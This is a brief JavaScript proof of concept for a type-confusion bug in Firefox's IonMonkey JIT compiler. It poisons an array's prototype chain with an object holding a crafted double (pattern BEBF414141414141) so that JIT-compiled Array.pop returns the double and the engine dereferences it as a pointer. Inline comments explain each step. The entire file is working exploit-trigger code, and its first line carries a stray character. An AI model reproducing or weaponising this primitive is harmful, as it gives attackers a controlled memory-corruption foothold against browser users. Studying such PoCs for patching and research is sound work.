nconst v4 = [{a: 0}, {a: 1}, {a: 2}, {a: 3}, {a: 4}];

function v7() {
	
	//this if branch is hit after a few calls of v4.pop
    if (v4.length == 0) {
		//v4 is now a sparse array, so it scans up the prototype chain
        v4[3] = {a: 5};
    }

    // pop the last value. IonMonkey will, based on inferred types, conclude that the result
    // will always be an object, which is untrue when  p[0] is fetched here.
    v11 = v4.pop();
    
	// Then it will crash here when dereferencing a controlled double value as pointer.
    v11.a;

    // Force JIT compilation.
    for (let v15 = 0; v15 < 10000; v15++) {}
}

var p = {};
p.__proto__ = [{a: 0}, {a: 1}, {a: 2}];

//BEBF414141414141
//this indexed property is not checked by IonMonkey
//intermediate prototype (p) between the array and the ArrayPrototype is not checked
p[0] = -1.8629373288622089e-06;

//p[0] = 2261634.5098039214;
v4.__proto__ = p;

for (let v31 = 0; v31 < 1000; v31++) {
    v7();
}

//console.log(corruptedObj[0]);
